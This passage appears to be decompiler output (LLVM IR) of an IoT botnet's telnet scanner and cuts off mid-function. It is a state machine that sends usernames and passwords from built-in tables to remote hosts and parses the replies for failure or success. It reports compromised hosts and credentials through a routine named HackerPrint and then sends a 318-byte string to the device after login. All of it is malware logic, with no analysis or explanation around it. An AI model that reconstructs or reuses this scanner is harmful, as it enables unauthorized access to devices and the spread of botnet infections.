  store i32 4, i32* %r2.global-to-local, align 4
  %v4_e900 = load i32, i32* %stack_var_-344, align 4
  %v5_e900 = call i32 @getsockopt(i32 %v0_e8f0, i32 1, i32 4, i32 %v2_e8e4, i32 %v4_e900)
  %v3_e904 = load i32, i32* %stack_var_-344, align 4
  %v2_e908 = icmp eq i32 %v3_e904, 0
  store i32 %v3_e264, i32* %r2.global-to-local, align 4
  %v2_e9a0 = load i32, i32* %v1_e7e0, align 4
  br i1 %v2_e908, label %dec_label_pc_e988, label %dec_label_pc_e910

dec_label_pc_e910:                                ; preds = %dec_label_pc_e8b8
  %v3_e930 = call i32 @sclose(i32 %v2_e9a0, i32 %v3_e174, i32 %v3_e264)
  %v2_e950 = add i32 %v2_e270, 8
  %v3_e958 = inttoptr i32 %v2_e950 to i8*
  store i8 0, i8* %v3_e958, align 4
  store i32 %v2_e950, i32* %r2.global-to-local, align 4
  %v3_e980 = add i32 %v2_e270, 9
  %v4_e980 = inttoptr i32 %v3_e980 to i8*
  store i8 1, i8* %v4_e980, align 1
  br label %dec_label_pc_f7ec

dec_label_pc_e988:                                ; preds = %dec_label_pc_e8b8
  store i32 %v2_e9a0, i32* @r4, align 4
  store i32 %v3_e264, i32* %r2.global-to-local, align 4
  %v2_e9bc = load i32, i32* %v1_e7e0, align 4
  store i32 %v2_e9bc, i32* @r3, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_e9cc = call i32 @__libc_fcntl(i32 %v2_e9bc, i32 3)
  %v1_e9d4 = and i32 %v2_e9cc, -2049
  store i32 %v1_e9d4, i32* @r3, align 4
  %v0_e9d8 = load i32, i32* @r4, align 4
  store i32 %v1_e9d4, i32* %r2.global-to-local, align 4
  %v2_e9e4 = call i32 @__libc_fcntl(i32 %v0_e9d8, i32 4)
  store i32 0, i32* %v1_e278, align 4
  %v3_ea34 = add i32 %v2_e270, 20
  %v4_ea34 = inttoptr i32 %v3_ea34 to i16*
  store i16 0, i16* %v4_ea34, align 4
  store i32 %v3_e264, i32* %r2.global-to-local, align 4
  %v2_ea54 = add i32 %v2_e26c, %v2_ea50
  %v1_ea58 = inttoptr i32 %v2_ea54 to i32*
  %v2_ea58 = load i32, i32* %v1_ea58, align 4
  store i32 1024, i32* @r2, align 4
  %v2_ea68 = inttoptr i32 %v2_ea58 to i8*
  %v3_ea68 = call i32 @__GI_memset(i8* %v2_ea68, i32 0)
  %v2_ea88 = add i32 %v2_e270, 8
  store i32 %v2_ea88, i32* %r2.global-to-local, align 4
  %v3_ea90 = inttoptr i32 %v2_ea88 to i8*
  store i8 2, i8* %v3_ea90, align 4
  br label %dec_label_pc_f7ec

dec_label_pc_ea98:                                ; preds = %dec_label_pc_e7c8
  %v3_ea9c = icmp eq i32 %v5_e8a0, -1
  br i1 %v3_ea9c, label %dec_label_pc_eaa4, label %dec_label_pc_eb1c

dec_label_pc_eaa4:                                ; preds = %dec_label_pc_ea98
  store i32 %v3_e264, i32* %r2.global-to-local, align 4
  %v2_eabc = load i32, i32* %v1_e7e0, align 4
  %v3_eac4 = call i32 @sclose(i32 %v2_eabc, i32 %v3_e174, i32 %v3_e264)
  %v2_eae4 = add i32 %v2_e270, 8
  %v3_eaec = inttoptr i32 %v2_eae4 to i8*
  store i8 0, i8* %v3_eaec, align 4
  store i32 %v2_eae4, i32* %r2.global-to-local, align 4
  %v3_eb14 = add i32 %v2_e270, 9
  %v4_eb14 = inttoptr i32 %v3_eb14 to i8*
  store i8 1, i8* %v4_eb14, align 1
  br label %dec_label_pc_f7ec

dec_label_pc_eb1c:                                ; preds = %dec_label_pc_ea98
  store i32 %v3_e264, i32* %r2.global-to-local, align 4
  %v2_eb3c = load i32, i32* %v1_e278, align 4
  %v1_eb40 = add i32 %v2_eb3c, 6
  store i32 %v1_eb40, i32* @r4, align 4
  %v2_eb48 = call i32 @__GI_time(i32* null)
  %v0_eb50 = load i32, i32* @r4, align 4
  %v3_eb50 = icmp ult i32 %v0_eb50, %v2_eb48
  br i1 %v3_eb50, label %dec_label_pc_eb58, label %dec_label_pc_f7ec

dec_label_pc_eb58:                                ; preds = %dec_label_pc_eb1c
  store i32 %v3_e264, i32* %r2.global-to-local, align 4
  %v2_eb70 = load i32, i32* %v1_e7e0, align 4
  %v3_eb78 = call i32 @sclose(i32 %v2_eb70, i32 %v3_e174, i32 %v3_e264)
  %v2_eb98 = add i32 %v2_e270, 8
  %v3_eba0 = inttoptr i32 %v2_eb98 to i8*
  store i8 0, i8* %v3_eba0, align 4
  store i32 %v2_eb98, i32* %r2.global-to-local, align 4
  %v3_ebc8 = add i32 %v2_e270, 9
  %v4_ebc8 = inttoptr i32 %v3_ebc8 to i8*
  store i8 1, i8* %v4_ebc8, align 1
  br label %dec_label_pc_f7ec

dec_label_pc_ebd0:                                ; preds = %dec_label_pc_e2bc
  store i32 %v3_e264, i32* %r2.global-to-local, align 4
  %v1_ebe8 = inttoptr i32 %v2_e270 to i32*
  %v2_ebe8 = load i32, i32* %v1_ebe8, align 4
  store i32 %v2_ebe8, i32* %ip.global-to-local, align 4
  store i32 %v3_e264, i32* %r2.global-to-local, align 4
  %v2_ec08 = add i32 %v2_e26c, %v2_ea50
  %v1_ec0c = inttoptr i32 %v2_ec08 to i32*
  %v2_ec0c = load i32, i32* %v1_ec0c, align 4
  store i32 %v2_ec0c, i32* %r2.global-to-local, align 4
  %v1_ec14 = load i32, i32* @sp, align 4
  %v2_ec14 = inttoptr i32 %v1_ec14 to i32*
  store i32 ptrtoint (i32* @global_var_2c204 to i32), i32* %v2_ec14, align 4
  %v0_ec18 = load i32, i32* %ip.global-to-local, align 4
  %v4_ec24 = inttoptr i32 %v2_ec0c to i8*
  %v5_ec24 = call i32 @read_until_response(i32 %v0_ec18, i32 10, i8* %v4_ec24, i32 1024)
  %v2_ec2c = icmp eq i32 %v5_ec24, 0
  br i1 %v2_ec2c, label %dec_label_pc_ecc4, label %dec_label_pc_ec34

dec_label_pc_ec34:                                ; preds = %dec_label_pc_ebd0
  store i32 %v3_e264, i32* %r2.global-to-local, align 4
  %v2_ec54 = load i32, i32* %v1_ec0c, align 4
  %v3_ec5c = call i32 @contains_fail(i32 %v2_ec54, i32 %v3_e174, i32 %v3_e264)
  %v2_ec64 = icmp eq i32 %v3_ec5c, 0
  %v2_ecb4 = add i32 %v2_e270, 8
  store i32 %v2_ecb4, i32* %r2.global-to-local, align 4
  br i1 %v2_ec64, label %dec_label_pc_ec98, label %dec_label_pc_ec6c

dec_label_pc_ec6c:                                ; preds = %dec_label_pc_ec34
  %v3_ec90 = inttoptr i32 %v2_ecb4 to i8*
  store i8 0, i8* %v3_ec90, align 4
  br label %dec_label_pc_f7ec

dec_label_pc_ec98:                                ; preds = %dec_label_pc_ec34
  %v3_ecbc = inttoptr i32 %v2_ecb4 to i8*
  store i8 3, i8* %v3_ecbc, align 4
  br label %dec_label_pc_f7ec

dec_label_pc_ecc4:                                ; preds = %dec_label_pc_ebd0
  store i32 %v3_e264, i32* %r2.global-to-local, align 4
  %v2_ece4 = load i32, i32* %v1_e278, align 4
  %v1_ece8 = add i32 %v2_ece4, 6
  store i32 %v1_ece8, i32* @r4, align 4
  %v2_ecf0 = call i32 @__GI_time(i32* null)
  %v0_ecf8 = load i32, i32* @r4, align 4
  %v3_ecf8 = icmp ult i32 %v0_ecf8, %v2_ecf0
  br i1 %v3_ecf8, label %dec_label_pc_ed00, label %dec_label_pc_f7ec

dec_label_pc_ed00:                                ; preds = %dec_label_pc_ecc4
  %v2_ed1c = add i32 %v2_e270, 8
  %v3_ed24 = inttoptr i32 %v2_ed1c to i8*
  store i8 0, i8* %v3_ed24, align 4
  store i32 %v2_ed1c, i32* %r2.global-to-local, align 4
  %v3_ed4c = add i32 %v2_e270, 9
  %v4_ed4c = inttoptr i32 %v3_ed4c to i8*
  store i8 1, i8* %v4_ed4c, align 1
  br label %dec_label_pc_f7ec

dec_label_pc_ed54:                                ; preds = %dec_label_pc_e2bc
  store i32 %v3_e264, i32* %r2.global-to-local, align 4
  %v1_ed6c = inttoptr i32 %v2_e270 to i32*
  %v2_ed6c = load i32, i32* %v1_ed6c, align 4
  store i32 %v2_ed6c, i32* @r4, align 4
  store i32 %v3_e264, i32* %r2.global-to-local, align 4
  %v2_ed8c = add i32 %v2_e270, 8
  %v1_ed90 = add i32 %v2_e270, 10
  %v2_ed90 = inttoptr i32 %v1_ed90 to i8*
  %v3_ed90 = load i8, i8* %v2_ed90, align 2
  %v4_ed90 = zext i8 %v3_ed90 to i32
  store i32 %v4_ed90, i32* %r2.global-to-local, align 4
  %v4_ed9c = mul nuw nsw i32 %v4_ed90, 4
  %v5_ed9c = add i32 %v4_ed9c, ptrtoint ([7 x i8*]* @global_var_2c1e8.503 to i32)
  %v6_ed9c = inttoptr i32 %v5_ed9c to i32*
  %v7_ed9c = load i32, i32* %v6_ed9c, align 4
  store i32 %v7_ed9c, i32* @r5, align 4
  store i32 %v3_e264, i32* %r2.global-to-local, align 4
  %v3_edc0 = load i8, i8* %v2_ed90, align 2
  %v4_edc0 = zext i8 %v3_edc0 to i32
  store i32 %v4_edc0, i32* %r2.global-to-local, align 4
  %v4_edcc = mul nuw nsw i32 %v4_edc0, 4
  %v5_edcc = add i32 %v4_edcc, ptrtoint ([7 x i8*]* @global_var_2c1e8.503 to i32)
  %v6_edcc = inttoptr i32 %v5_edcc to i32*
  %v7_edcc = load i32, i32* %v6_edcc, align 4
  %v1_edd0 = inttoptr i32 %v7_edcc to i8*
  %v3_edd4 = call i32 @strlen(i8* %v1_edd0)
  %v0_eddc = load i32, i32* @r4, align 4
  %v0_ede0 = load i32, i32* @r5, align 4
  store i32 %v3_edd4, i32* %r2.global-to-local, align 4
  %v4_edec = call i32 @__libc_send(i32 %v0_eddc, i32 %v0_ede0, i32 %v3_edd4, i32 16384)
  %v1_edf4 = icmp slt i32 %v4_edec, 0
  br i1 %v1_edf4, label %dec_label_pc_edfc, label %dec_label_pc_ee50

dec_label_pc_edfc:                                ; preds = %dec_label_pc_ed54
  %v3_ee20 = inttoptr i32 %v2_ed8c to i8*
  store i8 0, i8* %v3_ee20, align 4
  store i32 %v2_ed8c, i32* %r2.global-to-local, align 4
  %v3_ee48 = add i32 %v2_e270, 9
  %v4_ee48 = inttoptr i32 %v3_ee48 to i8*
  store i8 1, i8* %v4_ee48, align 1
  br label %dec_label_pc_f7ec

dec_label_pc_ee50:                                ; preds = %dec_label_pc_ed54
  store i32 %v3_e264, i32* %r2.global-to-local, align 4
  %v2_ee68 = load i32, i32* %v1_ed6c, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v5_ee7c = call i32 @__libc_send(i32 %v2_ee68, i32 ptrtoint ([3 x i8]* @global_var_209d0.505 to i32), i32 2, i32 16384)
  %v1_ee84 = icmp slt i32 %v5_ee7c, 0
  store i32 %v2_ed8c, i32* %r2.global-to-local, align 4
  br i1 %v1_ee84, label %dec_label_pc_ee8c, label %dec_label_pc_eee0

dec_label_pc_ee8c:                                ; preds = %dec_label_pc_ee50
  %v3_eeb0 = inttoptr i32 %v2_ed8c to i8*
  store i8 0, i8* %v3_eeb0, align 4
  store i32 %v2_ed8c, i32* %r2.global-to-local, align 4
  %v3_eed8 = add i32 %v2_e270, 9
  %v4_eed8 = inttoptr i32 %v3_eed8 to i8*
  store i8 1, i8* %v4_eed8, align 1
  br label %dec_label_pc_f7ec

dec_label_pc_eee0:                                ; preds = %dec_label_pc_ee50
  %v3_ef04 = inttoptr i32 %v2_ed8c to i8*
  store i8 4, i8* %v3_ef04, align 4
  br label %dec_label_pc_f7ec

dec_label_pc_ef0c:                                ; preds = %dec_label_pc_e2bc
  store i32 %v3_e264, i32* %r2.global-to-local, align 4
  %v1_ef24 = inttoptr i32 %v2_e270 to i32*
  %v2_ef24 = load i32, i32* %v1_ef24, align 4
  store i32 %v2_ef24, i32* %ip.global-to-local, align 4
  store i32 %v3_e264, i32* %r2.global-to-local, align 4
  %v2_ef44 = add i32 %v2_e26c, %v2_ea50
  %v1_ef48 = inttoptr i32 %v2_ef44 to i32*
  %v2_ef48 = load i32, i32* %v1_ef48, align 4
  store i32 %v2_ef48, i32* %r2.global-to-local, align 4
  %v1_ef50 = load i32, i32* @sp, align 4
  %v2_ef50 = inttoptr i32 %v1_ef50 to i32*
  store i32 ptrtoint (i32* @global_var_2c204 to i32), i32* %v2_ef50, align 4
  %v0_ef54 = load i32, i32* %ip.global-to-local, align 4
  %v4_ef60 = inttoptr i32 %v2_ef48 to i8*
  %v5_ef60 = call i32 @read_until_response(i32 %v0_ef54, i32 10, i8* %v4_ef60, i32 1024)
  %v2_ef68 = icmp eq i32 %v5_ef60, 0
  br i1 %v2_ef68, label %dec_label_pc_f000, label %dec_label_pc_ef70

dec_label_pc_ef70:                                ; preds = %dec_label_pc_ef0c
  store i32 %v3_e264, i32* %r2.global-to-local, align 4
  %v2_ef90 = load i32, i32* %v1_ef48, align 4
  %v3_ef98 = call i32 @contains_fail(i32 %v2_ef90, i32 %v3_e174, i32 %v3_e264)
  %v2_efa0 = icmp eq i32 %v3_ef98, 0
  %v2_eff0 = add i32 %v2_e270, 8
  store i32 %v2_eff0, i32* %r2.global-to-local, align 4
  br i1 %v2_efa0, label %dec_label_pc_efd4, label %dec_label_pc_efa8

dec_label_pc_efa8:                                ; preds = %dec_label_pc_ef70
  %v3_efcc = inttoptr i32 %v2_eff0 to i8*
  store i8 0, i8* %v3_efcc, align 4
  br label %dec_label_pc_f7ec

dec_label_pc_efd4:                                ; preds = %dec_label_pc_ef70
  %v3_eff8 = inttoptr i32 %v2_eff0 to i8*
  store i8 5, i8* %v3_eff8, align 4
  br label %dec_label_pc_f7ec

dec_label_pc_f000:                                ; preds = %dec_label_pc_ef0c
  store i32 %v3_e264, i32* %r2.global-to-local, align 4
  %v2_f020 = load i32, i32* %v1_e278, align 4
  %v1_f024 = add i32 %v2_f020, 6
  store i32 %v1_f024, i32* @r4, align 4
  %v2_f02c = call i32 @__GI_time(i32* null)
  %v0_f034 = load i32, i32* @r4, align 4
  %v3_f034 = icmp ult i32 %v0_f034, %v2_f02c
  br i1 %v3_f034, label %dec_label_pc_f03c, label %dec_label_pc_f7ec

dec_label_pc_f03c:                                ; preds = %dec_label_pc_f000
  %v2_f058 = add i32 %v2_e270, 8
  %v3_f060 = inttoptr i32 %v2_f058 to i8*
  store i8 0, i8* %v3_f060, align 4
  store i32 %v2_f058, i32* %r2.global-to-local, align 4
  %v3_f088 = add i32 %v2_e270, 9
  %v4_f088 = inttoptr i32 %v3_f088 to i8*
  store i8 1, i8* %v4_f088, align 1
  br label %dec_label_pc_f7ec

dec_label_pc_f090:                                ; preds = %dec_label_pc_e2bc
  store i32 %v3_e264, i32* %r2.global-to-local, align 4
  %v1_f0a8 = inttoptr i32 %v2_e270 to i32*
  %v2_f0a8 = load i32, i32* %v1_f0a8, align 4
  store i32 %v2_f0a8, i32* @r4, align 4
  store i32 %v3_e264, i32* %r2.global-to-local, align 4
  %v2_f0c8 = add i32 %v2_e270, 8
  %v1_f0cc = add i32 %v2_e270, 11
  %v2_f0cc = inttoptr i32 %v1_f0cc to i8*
  %v3_f0cc = load i8, i8* %v2_f0cc, align 1
  %v4_f0cc = zext i8 %v3_f0cc to i32
  store i32 %v4_f0cc, i32* %r2.global-to-local, align 4
  %v4_f0d8 = mul nuw nsw i32 %v4_f0cc, 4
  %v5_f0d8 = add i32 %v4_f0d8, ptrtoint ([4 x i8*]* @global_var_2c1f4.507 to i32)
  %v6_f0d8 = inttoptr i32 %v5_f0d8 to i32*
  %v7_f0d8 = load i32, i32* %v6_f0d8, align 4
  store i32 %v7_f0d8, i32* @r5, align 4
  store i32 %v3_e264, i32* %r2.global-to-local, align 4
  %v3_f0fc = load i8, i8* %v2_f0cc, align 1
  %v4_f0fc = zext i8 %v3_f0fc to i32
  store i32 %v4_f0fc, i32* %r2.global-to-local, align 4
  %v4_f108 = mul nuw nsw i32 %v4_f0fc, 4
  %v5_f108 = add i32 %v4_f108, ptrtoint ([4 x i8*]* @global_var_2c1f4.507 to i32)
  %v6_f108 = inttoptr i32 %v5_f108 to i32*
  %v7_f108 = load i32, i32* %v6_f108, align 4
  %v1_f10c = inttoptr i32 %v7_f108 to i8*
  %v3_f110 = call i32 @strlen(i8* %v1_f10c)
  %v0_f118 = load i32, i32* @r4, align 4
  %v0_f11c = load i32, i32* @r5, align 4
  store i32 %v3_f110, i32* %r2.global-to-local, align 4
  %v4_f128 = call i32 @__libc_send(i32 %v0_f118, i32 %v0_f11c, i32 %v3_f110, i32 16384)
  %v1_f130 = icmp slt i32 %v4_f128, 0
  br i1 %v1_f130, label %dec_label_pc_f138, label %dec_label_pc_f18c

dec_label_pc_f138:                                ; preds = %dec_label_pc_f090
  %v3_f15c = inttoptr i32 %v2_f0c8 to i8*
  store i8 0, i8* %v3_f15c, align 4
  store i32 %v2_f0c8, i32* %r2.global-to-local, align 4
  %v3_f184 = add i32 %v2_e270, 9
  %v4_f184 = inttoptr i32 %v3_f184 to i8*
  store i8 1, i8* %v4_f184, align 1
  br label %dec_label_pc_f7ec

dec_label_pc_f18c:                                ; preds = %dec_label_pc_f090
  store i32 %v3_e264, i32* %r2.global-to-local, align 4
  %v2_f1a4 = load i32, i32* %v1_f0a8, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v5_f1b8 = call i32 @__libc_send(i32 %v2_f1a4, i32 ptrtoint ([3 x i8]* @global_var_209d0.505 to i32), i32 2, i32 16384)
  %v1_f1c0 = icmp slt i32 %v5_f1b8, 0
  store i32 %v2_f0c8, i32* %r2.global-to-local, align 4
  br i1 %v1_f1c0, label %dec_label_pc_f1c8, label %dec_label_pc_f21c

dec_label_pc_f1c8:                                ; preds = %dec_label_pc_f18c
  %v3_f1ec = inttoptr i32 %v2_f0c8 to i8*
  store i8 0, i8* %v3_f1ec, align 4
  store i32 %v2_f0c8, i32* %r2.global-to-local, align 4
  %v3_f214 = add i32 %v2_e270, 9
  %v4_f214 = inttoptr i32 %v3_f214 to i8*
  store i8 1, i8* %v4_f214, align 1
  br label %dec_label_pc_f7ec

dec_label_pc_f21c:                                ; preds = %dec_label_pc_f18c
  %v3_f240 = inttoptr i32 %v2_f0c8 to i8*
  store i8 6, i8* %v3_f240, align 4
  br label %dec_label_pc_f7ec

dec_label_pc_f248:                                ; preds = %dec_label_pc_e2bc
  store i32 %v3_e264, i32* %r2.global-to-local, align 4
  %v1_f260 = inttoptr i32 %v2_e270 to i32*
  %v2_f260 = load i32, i32* %v1_f260, align 4
  store i32 %v2_f260, i32* %ip.global-to-local, align 4
  store i32 %v3_e264, i32* %r2.global-to-local, align 4
  %v2_f280 = add i32 %v2_e26c, %v2_ea50
  %v1_f284 = inttoptr i32 %v2_f280 to i32*
  %v2_f284 = load i32, i32* %v1_f284, align 4
  store i32 %v2_f284, i32* %r2.global-to-local, align 4
  %v1_f28c = load i32, i32* @sp, align 4
  %v2_f28c = inttoptr i32 %v1_f28c to i32*
  store i32 ptrtoint ([10 x i8*]* @global_var_2c248.509 to i32), i32* %v2_f28c, align 4
  %v0_f290 = load i32, i32* %ip.global-to-local, align 4
  %v4_f29c = inttoptr i32 %v2_f284 to i8*
  %v5_f29c = call i32 @read_until_response(i32 %v0_f290, i32 10, i8* %v4_f29c, i32 1024)
  %v2_f2a4 = icmp eq i32 %v5_f29c, 0
  br i1 %v2_f2a4, label %dec_label_pc_f5a0, label %dec_label_pc_f2ac

dec_label_pc_f2ac:                                ; preds = %dec_label_pc_f248
  store i32 %storemerge612, i32* @r4, align 4
  %v2_f2b4 = call i32 @__GI_time(i32* null)
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_f2c8 = load i32, i32* @r4, align 4
  %v2_f2d4 = mul i32 %v0_f2c8, 28
  %v2_f2dc = add i32 %v2_f5b8, %v2_f2d4
  %v2_f2e0 = inttoptr i32 %v2_f2dc to i32*
  store i32 %v2_f2b4, i32* %v2_f2e0, align 4
  store i32 %v3_e264, i32* %r2.global-to-local, align 4
  %v2_f300 = add i32 %v2_e270, 24
  %v1_f304 = inttoptr i32 %v2_f300 to i32*
  %v2_f304 = load i32, i32* %v1_f304, align 4
  %v3_f30c = call i32 @contains_fail(i32 %v2_f304, i32 %v3_e174, i32 %v3_e264)
  %v2_f314 = icmp eq i32 %v3_f30c, 0
  br i1 %v2_f314, label %dec_label_pc_f348, label %dec_label_pc_f31c

dec_label_pc_f31c:                                ; preds = %dec_label_pc_f2ac
  %v2_f338 = add i32 %v2_e270, 8
  store i32 %v2_f338, i32* %r2.global-to-local, align 4
  %v3_f340 = inttoptr i32 %v2_f338 to i8*
  store i8 0, i8* %v3_f340, align 4
  br label %dec_label_pc_f7ec

dec_label_pc_f348:                                ; preds = %dec_label_pc_f2ac
  store i32 %v3_e264, i32* %r2.global-to-local, align 4
  %v2_f368 = load i32, i32* %v1_f304, align 4
  %v3_f370 = call i32 @contains_success(i32 %v2_f368, i32 %v3_e174, i32 %v3_e264)
  %v2_f378 = icmp eq i32 %v3_f370, 0
  store i32 %v3_e264, i32* %r2.global-to-local, align 4
  %v2_f568 = add i32 %v2_e270, 8
  br i1 %v2_f378, label %dec_label_pc_f54c, label %dec_label_pc_f380

dec_label_pc_f380:                                ; preds = %dec_label_pc_f348
  %v1_f3a0 = add i32 %v2_e270, 9
  %v2_f3a0 = inttoptr i32 %v1_f3a0 to i8*
  %v3_f3a0 = load i8, i8* %v2_f3a0, align 1
  %v7_f3a4 = icmp eq i8 %v3_f3a0, 2
  br i1 %v7_f3a4, label %dec_label_pc_f3ac, label %dec_label_pc_f3d8

dec_label_pc_f3ac:                                ; preds = %dec_label_pc_f380
  store i32 %v2_f568, i32* %r2.global-to-local, align 4
  %v3_f3d0 = inttoptr i32 %v2_f568 to i8*
  store i8 7, i8* %v3_f3d0, align 4
  br label %dec_label_pc_f7ec

dec_label_pc_f3d8:                                ; preds = %dec_label_pc_f380
  %v2_f3dc = load i32, i32* @global_var_2c5e8.50, align 4
  store i32 %v2_f3dc, i32* @r4, align 4
  store i32 %v3_e264, i32* %r2.global-to-local, align 4
  %v3_f3fc = call i32 @get_telstate_host(i32 %v2_e270, i32 %v3_e174, i32 %v3_e264)
  store i32 %v3_f3fc, i32* %ip.global-to-local, align 4
  store i32 %v3_e264, i32* %r2.global-to-local, align 4
  %v1_f424 = add i32 %v2_e270, 10
  %v2_f424 = inttoptr i32 %v1_f424 to i8*
  %v3_f424 = load i8, i8* %v2_f424, align 2
  %v4_f424 = zext i8 %v3_f424 to i32
  store i32 %v4_f424, i32* %r2.global-to-local, align 4
  %v4_f430 = mul nuw nsw i32 %v4_f424, 4
  %v5_f430 = add i32 %v4_f430, ptrtoint ([7 x i8*]* @global_var_2c1e8.503 to i32)
  %v6_f430 = inttoptr i32 %v5_f430 to i32*
  %v7_f430 = load i32, i32* %v6_f430, align 4
  store i32 %v7_f430, i32* @lr, align 4
  store i32 %v3_e264, i32* %r2.global-to-local, align 4
  %v1_f454 = add i32 %v2_e270, 11
  %v2_f454 = inttoptr i32 %v1_f454 to i8*
  %v3_f454 = load i8, i8* %v2_f454, align 1
  %v4_f454 = zext i8 %v3_f454 to i32
  store i32 %v4_f454, i32* %r2.global-to-local, align 4
  %v4_f460 = mul nuw nsw i32 %v4_f454, 4
  %v5_f460 = add i32 %v4_f460, ptrtoint ([4 x i8*]* @global_var_2c1f4.507 to i32)
  %v6_f460 = inttoptr i32 %v5_f460 to i32*
  %v7_f460 = load i32, i32* %v6_f460, align 4
  %v1_f464 = load i32, i32* @sp, align 4
  %v2_f464 = inttoptr i32 %v1_f464 to i32*
  store i32 %v7_f460, i32* %v2_f464, align 4
  %v0_f468 = load i32, i32* @r4, align 4
  %v0_f470 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_f470, i32* @r2, align 4
  %v2_f478 = call i32 @HackerPrint(i32 %v0_f468, i32 ptrtoint (i32* @global_var_209d4.512 to i32))
  %v2_f480 = load i32, i32* @global_var_2c5e8.50, align 4
  store i32 %v2_f480, i32* @r4, align 4
  store i32 %v3_e264, i32* %r2.global-to-local, align 4
  %v3_f4a0 = call i32 @get_telstate_host(i32 %v2_e270, i32 %v3_e174, i32 %v3_e264)
  store i32 %v3_f4a0, i32* %ip.global-to-local, align 4
  store i32 %v3_e264, i32* %r2.global-to-local, align 4
  %v3_f4c8 = load i8, i8* %v2_f424, align 2
  %v4_f4c8 = zext i8 %v3_f4c8 to i32
  store i32 %v4_f4c8, i32* %r2.global-to-local, align 4
  %v4_f4d4 = mul nuw nsw i32 %v4_f4c8, 4
  %v5_f4d4 = add i32 %v4_f4d4, ptrtoint ([7 x i8*]* @global_var_2c1e8.503 to i32)
  %v6_f4d4 = inttoptr i32 %v5_f4d4 to i32*
  %v7_f4d4 = load i32, i32* %v6_f4d4, align 4
  store i32 %v7_f4d4, i32* @lr, align 4
  store i32 %v3_e264, i32* %r2.global-to-local, align 4
  %v3_f4f8 = load i8, i8* %v2_f454, align 1
  %v4_f4f8 = zext i8 %v3_f4f8 to i32
  store i32 %v4_f4f8, i32* %r2.global-to-local, align 4
  %v4_f504 = mul nuw nsw i32 %v4_f4f8, 4
  %v5_f504 = add i32 %v4_f504, ptrtoint ([4 x i8*]* @global_var_2c1f4.507 to i32)
  %v6_f504 = inttoptr i32 %v5_f504 to i32*
  %v7_f504 = load i32, i32* %v6_f504, align 4
  %v1_f508 = load i32, i32* @sp, align 4
  %v2_f508 = inttoptr i32 %v1_f508 to i32*
  store i32 %v7_f504, i32* %v2_f508, align 4
  %v0_f50c = load i32, i32* @r4, align 4
  %v0_f514 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_f514, i32* @r2, align 4
  %v3_f51c = call i32 @HackerPrint(i32 %v0_f50c, i32 ptrtoint ([16 x i8]* @global_var_20a40.514 to i32))
  store i32 %v2_f568, i32* %r2.global-to-local, align 4
  %v3_f544 = inttoptr i32 %v2_f568 to i8*
  store i8 7, i8* %v3_f544, align 4
  br label %dec_label_pc_f7ec

dec_label_pc_f54c:                                ; preds = %dec_label_pc_f348
  %v3_f570 = inttoptr i32 %v2_f568 to i8*
  store i8 0, i8* %v3_f570, align 4
  store i32 %v2_f568, i32* %r2.global-to-local, align 4
  %v3_f598 = add i32 %v2_e270, 9
  %v4_f598 = inttoptr i32 %v3_f598 to i8*
  store i8 1, i8* %v4_f598, align 1
  br label %dec_label_pc_f7ec

dec_label_pc_f5a0:                                ; preds = %dec_label_pc_f248
  store i32 %v3_e264, i32* %r2.global-to-local, align 4
  %v2_f5bc = add i32 %v2_e26c, %v2_f5b8
  %v1_f5c0 = inttoptr i32 %v2_f5bc to i32*
  %v2_f5c0 = load i32, i32* %v1_f5c0, align 4
  %v1_f5c4 = add i32 %v2_f5c0, 7
  store i32 %v1_f5c4, i32* @r4, align 4
  %v2_f5cc = call i32 @__GI_time(i32* null)
  %v0_f5d4 = load i32, i32* @r4, align 4
  %v3_f5d4 = icmp ult i32 %v0_f5d4, %v2_f5cc
  br i1 %v3_f5d4, label %dec_label_pc_f5dc, label %dec_label_pc_f7ec

dec_label_pc_f5dc:                                ; preds = %dec_label_pc_f5a0
  %v2_f5f8 = add i32 %v2_e270, 8
  %v3_f600 = inttoptr i32 %v2_f5f8 to i8*
  store i8 0, i8* %v3_f600, align 4
  store i32 %v2_f5f8, i32* %r2.global-to-local, align 4
  %v3_f628 = add i32 %v2_e270, 9
  %v4_f628 = inttoptr i32 %v3_f628 to i8*
  store i8 1, i8* %v4_f628, align 1
  br label %dec_label_pc_f7ec

dec_label_pc_f630:                                ; preds = %dec_label_pc_e2bc
  store i32 %storemerge612, i32* @r4, align 4
  %v2_f638 = call i32 @__GI_time(i32* null)
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_f64c = load i32, i32* @r4, align 4
  %v2_f658 = mul i32 %v0_f64c, 28
  %v2_f660 = add i32 %v2_f5b8, %v2_f658
  %v2_f664 = inttoptr i32 %v2_f660 to i32*
  store i32 %v2_f638, i32* %v2_f664, align 4
  store i32 %v3_e264, i32* %r2.global-to-local, align 4
  %v1_f680 = inttoptr i32 %v2_e270 to i32*
  %v2_f680 = load i32, i32* %v1_f680, align 4
  store i32 %v2_f680, i32* @r4, align 4
  %v2_f688 = load i32, i32* bitcast ([318 x i8]** @global_var_2c200.516 to i32*), align 4
  store i32 %v2_f688, i32* @r5, align 4
  %v1_f694 = inttoptr i32 %v2_f688 to i8*
  %v3_f698 = call i32 @strlen(i8* %v1_f694)
  %v0_f6a0 = load i32, i32* @r4, align 4
  %v0_f6a4 = load i32, i32* @r5, align 4
  store i32 %v3_f698, i32* %r2.global-to-local, align 4
  %v5_f6b0 = call i32 @__libc_send(i32 %v0_f6a0, i32 %v0_f6a4, i32 %v3_f698, i32 16384)
  %v1_f6b8 = icmp slt i32 %v5_f6b0, 0
  br i1 %v1_f6b8, label %dec_label_pc_f6c0, label %dec_label_pc_f738

dec_label_pc_f6c0:                                ; preds = %dec_label_pc_f630
  store i32 %v3_e264, i32* %r2.global-to-local, align 4
  %v2_f6d8 = load i32, i32* %v1_f680, align 4
  %v3_f6e0 = call i32 @sclose(i32 %v2_f6d8, i32 %v3_e174, i32 %v3_e264)
  %v2_f700 = add i32 %v2_e270, 8
  %v3_f708 = inttoptr i32 %v2_f700 to i8*
  store i8 0, i8* %v3_f708, align 4
  store i32 %v2_f700, i32* %r2.global-to-local, align 4
  %v3_f730 = add i32 %v2_e270, 9
  %v4_f730 = inttoptr i32 %v3_f730 to i8*
  store i8 1, i8* %v4_f730, align 1
  br label %dec_label_pc_f7ec

dec_label_pc_f738:                                ; preds = %dec_label_pc_f630
  %v2_f754 = add i32 %v2_e270, 8
